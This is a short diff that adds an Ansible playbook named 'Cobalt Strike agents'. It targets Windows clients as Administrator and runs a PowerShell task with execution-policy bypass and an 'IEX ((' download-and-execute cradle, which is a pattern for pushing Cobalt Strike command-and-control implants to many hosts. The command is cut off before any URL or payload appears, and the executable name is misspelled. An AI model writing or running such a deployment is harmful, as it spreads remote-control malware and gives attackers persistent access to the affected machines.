@@ -1,0 +1,10 @@
+# Cobalt Strike agents
+
+- hosts: windows-clients
+  gather_facts: no
+  remote_user: Administrator
+
+  tasks:
+    - name: Install agents
+      win_shell: \Windows\syswow64\windowspowershell\v1.0\pwoershell.exe -ep bypass -c "IEX ((
+
